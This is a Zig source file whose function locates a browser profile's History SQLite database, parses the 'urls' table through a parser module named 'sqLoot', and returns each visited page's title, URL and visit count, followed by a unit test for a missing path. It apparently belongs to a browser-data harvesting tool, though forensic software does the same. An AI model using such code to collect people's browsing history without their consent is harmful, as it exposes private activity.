const std = @import("std");
const sqLoot = @import("../parsers/sqLoot.zig");
const file_io = @import("../parsers/file_io.zig");

pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator) ?[][]const u8 {
    const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\History" }) catch return null;
    defer allocator.free(db_path);

    const mapped = file_io.MappedFile.open(db_path) orelse return null;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return null;
    defer db.deinit();

    const rows = db.readTable("urls") catch return null;
    defer allocator.free(rows);

    const cols = db.getColumnNames("urls") catch return null;
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
    }
    const url_idx = sqLoot.findColumnIndex(cols, "url") orelse return null;
    const title_idx = sqLoot.findColumnIndex(cols, "title") orelse return null;
    const count_idx = sqLoot.findColumnIndex(cols, "visit_count") orelse return null;

    var list = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (list.items) |item| allocator.free(item);
        list.deinit();
    }

    for (rows) |row| {
        if (row.len <= @max(url_idx, title_idx, count_idx)) continue;

        const title = if (row[title_idx] != .null) row[title_idx].text else "";
        const url = if (row[url_idx] != .null) row[url_idx].text else "";
        const visit_count = if (row[count_idx] != .null) row[count_idx].int else @as(i64, 0);

        const line = std.fmt.allocPrint(allocator, "{s}\t{s}\t{d}\n", .{ title, url, visit_count }) catch continue;
        list.append(line) catch continue;
    }

    if (list.items.len == 0) return null;
    return list.toOwnedSlice();
}

test "extractData returns null for missing path" {
    const result = extractData("C:\\__nonexistent__", std.testing.allocator);
    try std.testing.expect(result == null);
}
